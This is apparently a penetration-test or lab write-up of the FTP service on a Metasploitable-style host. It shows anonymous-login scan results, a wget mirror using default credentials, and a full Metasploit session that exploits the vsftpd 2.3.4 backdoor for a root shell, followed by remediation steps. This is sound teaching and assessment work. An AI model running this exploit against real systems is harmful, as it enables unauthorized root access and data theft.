
####  FTP (Port 21)

Anyone can gain an FTP session with anonymous credentials
anonymous:anonymous
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.100.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```
With the correct credentials, I can download all accessible files in an FTP session:
```
wget -m --no-passive ftp://msfadmin:msfadmin@192.168.100.22

ls -alt 192.168.100.22/vulnerable
total 28
drwxr-xr-x 3 root root 4096 Jan 27 16:21 twiki20030201
drwxr-xr-x 6 root root 4096 Jan 27 16:21 .
drwxr-xr-x 2 root root 4096 Jan 27 16:20 tikiwiki
drwxr-xr-x 5 root root 4096 Jan 27 16:20 samba
drwxr-xr-x 3 root root 4096 Jan 27 16:16 mysql-ssl
drwxr-xr-x 7 root root 4096 Jan 27 16:16 ..
-rw-r--r-- 1 root root  386 Jan 27 16:16 .listing

```
#####  Metasploit
```
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.100.22
RHOSTS => 192.168.100.22

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.100.22   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.100.22:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.100.22:21 - USER: 331 Please specify the password.
[+] 192.168.100.22:21 - Backdoor service has been spawned, handling...
[+] 192.168.100.22:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (192.168.100.24:37881 -> 192.168.100.22:6200) at 2024-01-27 16:36:19 -0500

whoami
root
```
####   Remediation Steps
- Disable Anonymous Access
- Upgrade vsftpd, to latest version which is **3.0.5**
	- CVE: CVE-2011-2523
	- Link: https://nvd.nist.gov/vuln/detail/CVE-2011-2523

